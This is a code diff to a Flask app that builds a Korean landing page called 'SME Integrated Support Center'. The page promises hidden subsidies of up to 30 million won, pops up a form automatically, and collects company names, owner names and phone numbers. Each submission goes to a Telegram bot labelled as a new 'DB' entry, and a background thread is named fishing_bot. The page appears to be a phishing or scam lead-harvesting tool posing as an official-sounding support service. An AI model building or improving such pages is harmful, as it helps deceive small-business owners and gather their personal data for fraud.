@@ -22,9 +22,6 @@ class BusinessLead(db.Model):
     biz_name = db.Column(db.String(100))
     owner_name = db.Column(db.String(50))
     phone = db.Column(db.String(20), unique=True)
-    workers = db.Column(db.String(20))
-    sales = db.Column(db.String(50))
-    goal = db.Column(db.String(50))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
 with app.app_context():
@@ -41,38 +38,74 @@ HTML_PAGE = r"""
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SME 통합지원센터</title>
+
 <style>
-body{background:#0f172a;color:white;font-family:sans-serif;padding:20px}
-input,select{width:100%;padding:12px;margin:8px 0}
-button{background:#fbbf24;padding:15px;width:100%;font-weight:bold}
+body{background:#0f172a;color:white;font-family:sans-serif;margin:0}
+.card{background:#1e293b;padding:25px;border-radius:20px;width:90%;max-width:400px;margin:auto;margin-top:80px}
+input{width:100%;padding:15px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:white;border-radius:10px}
+button{background:#fbbf24;padding:18px;width:100%;font-weight:bold;border:none;border-radius:12px;font-size:18px}
 </style>
 </head>
+
 <body>
 
-<h2>SME 통합지원센터</h2>
+<div style="text-align:center;margin-top:100px;">
+<h2>🔥 숨은 지원금 최대 3,000만원 확인</h2>
+<p>1분만에 내 회사 환급금 조회</p>
+<button onclick="openPopup()">내 지원금 확인하기</button>
+</div>
+
+<div id="popup" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);">
+
+<div class="card">
+<h3>SME 통합지원센터</h3>
 
 <input id="biz" placeholder="회사명">
 <input id="owner" placeholder="대표자">
 <input id="phone" placeholder="전화번호">
 
-<select id="goal">
-<option value="고용지원금">고용지원금</option>
-<option value="세금">세금</option>
-</select>
+<button onclick="submitLead()">무료 분석 신청</button>
 
-<button onclick="send()">신청</button>
+<a href="tel:01098091609" style="display:block;background:#22c55e;padding:15px;margin-top:10px;text-align:center;border-radius:10px;">
+📞 바로 상담하기
+</a>
+
+<button onclick="closePopup()" style="margin-top:10px;background:#334155;">닫기</button>
+
+</div>
+</div>
 
 <script>
-async function send(){
+
+window.onload = function(){
+setTimeout(()=>openPopup(),1000);
+}
+
+function openPopup(){
+document.getElementById('popup').style.display='block';
+}
+
+function closePopup(){
+document.getElementById('popup').style.display='none';
+}
+
+async function submitLead(){
 const data={
 biz:biz.value,
 owner:owner.value,
-phone:phone.value,
-goal:goal.value
+phone:phone.value
 }
-await fetch('/api/v1/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
-alert("완료")
+
+await fetch('/api/v1/submit',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify(data)
+})
+
+alert("신청 완료")
+closePopup()
 }
+
 </script>
 
 </body>
@@ -86,16 +119,16 @@ def home():
 @app.route('/api/v1/submit', methods=['POST'])
 def submit():
     data = request.json
+
     new = BusinessLead(
         biz_name=data['biz'],
         owner_name=data['owner'],
-        phone=data['phone'],
-        goal=data['goal']
+        phone=data['phone']
     )
     db.session.add(new)
     db.session.commit()
 
-    msg = f"{data['biz']} / {data['phone']}"
+    msg = f"🚨 신규 DB\n{data['biz']} / {data['phone']}"
     requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                   json={"chat_id": CHAT_ID, "text": msg})
 
@@ -103,6 +136,5 @@ def submit():
 
 if __name__ == '__main__':
     threading.Thread(target=fishing_bot, daemon=True).start()
-
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
